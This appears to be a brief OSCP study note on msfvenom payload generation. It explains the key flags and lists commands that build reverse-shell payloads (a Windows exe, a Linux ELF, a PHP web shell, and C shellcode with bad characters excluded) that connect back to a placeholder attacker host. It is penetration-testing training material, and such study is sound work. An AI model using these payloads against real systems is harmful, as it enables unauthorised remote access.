# 15.03 msfvenom Payload Generation

> Generate any payload format with `msfvenom` using `-p`, `-f`, `-e`, `-b`, `--platform`, `--arch`.

## Overview

Generate any shellcode/binary in any format from one tool. Knowing -p, -f, -e, -b, --platform, --arch is enough for 95% of OSCP needs.

## Steps

- **Pick payload + transport** — usually `windows/x64/shell_reverse_tcp` or `windows/meterpreter/reverse_tcp`.
- **Pick format** — exe, elf, raw, c, py, asp, war.
- **Exclude badchars (-b)** for BoF exploits.

## Commands

### msfvenom recipes

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o rev.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f elf -o rev.elf
msfvenom -p php/reverse_php LHOST=<LHOST> LPORT=<LPORT> -f raw -o shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -b '\\x00\\x0a\\x0d' -f c
```
